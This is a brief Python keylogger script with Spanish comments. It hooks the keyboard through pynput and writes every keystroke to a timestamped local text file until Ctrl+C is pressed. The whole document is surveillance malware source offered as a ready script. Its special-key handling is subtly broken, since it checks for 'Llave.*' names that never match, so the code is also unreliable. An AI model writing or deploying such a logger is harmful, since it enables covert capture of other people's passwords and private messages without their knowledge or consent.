import datetime 
from pynput.keyboard import Listener
from pyparsing import White

#Guardamos el datetime en x
x=datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")
#Cada archivo que yo vaya a crear tendrá el nombre de Keylogger_(y tendrá la fecha
# en la que se haya creado), le damos permisos de escritura con "w"
p=open(f"keylogger{x}.txt","w")

def registro(llave):
    llave=str(llave)

    if llave=="'\\x03'":
        p.close()
        quit()
    elif llave=="Llave.enter":
        p.write("\n")
    elif llave=="Llave.space":
        p.write(" ")
    elif llave=="Llave.backspace":
        p.write("%BORRAR%")
    else:
        p.write(llave.replace("'",""))

with Listener(on_press=registro) as u:
    u.join()


